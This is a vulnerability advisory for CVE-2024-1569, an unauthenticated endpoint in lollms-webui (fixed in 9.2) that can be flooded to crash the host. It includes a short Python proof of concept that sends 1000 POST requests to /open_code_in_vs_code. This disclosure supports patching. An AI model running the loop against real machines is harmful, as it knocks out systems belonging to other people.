---
description: CVE-2024-1569, MEDIUM, Unrestricted resource consumption in lollms-webui leads to denial of service
title: lollms-webui resource consumption DoS
date_published: "2024-04-15"
last_updated: "2024-04-15"
xray_id: JFSA-2024-001028813
vul_id: CVE-2024-1569
cvss: 5.3
severity: medium
discovered_by: Naveh Racovsky
type: vulnerability

---

## Summary

 Unrestricted resource consumption in lollms-webui leads to denial of service

## Component

[parisneo/lollms-webui](https://github.com/parisneo/lollms-webui)

## Affected versions

(,9.1], Fixed in 9.2

## Description

The `/open_code_in_vs_code` endpoint is open for access on a network level without authentication when the application is running exposed to the network (for example, by using `--host 0.0.0.0`, this could lead to a denial of service attack, which can crash the entire host machine. The attack happens by repeatedly sending HTTP POST requests to the `/open_code_in_vs_code` path. This leads to visual studio code repeatedly outside of the program, thus affecting the machine outside the program scope. Other endpoints are open to similar attacks and may be exploited similarly to this vulnerability.

## PoC

```bash
// PoC.py
import requests

IP_ADDRESS = "aaa.bbb.ccc.ddd"
PORT = 9600

for i in range(1000):
    data = {
        "code": "a",
        "discussion_id": f"{i}",
        "message_id": f"{i}",
    }
    response = requests.post(f"http://{IP_ADDRESS}:{str(PORT)}/open_code_in_vs_code", json=data)
    print(i, response.json())
```



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Advisory](https://huntr.com/bounties/369d1694-47e4-49bc-bb35-931ce4a5148e)

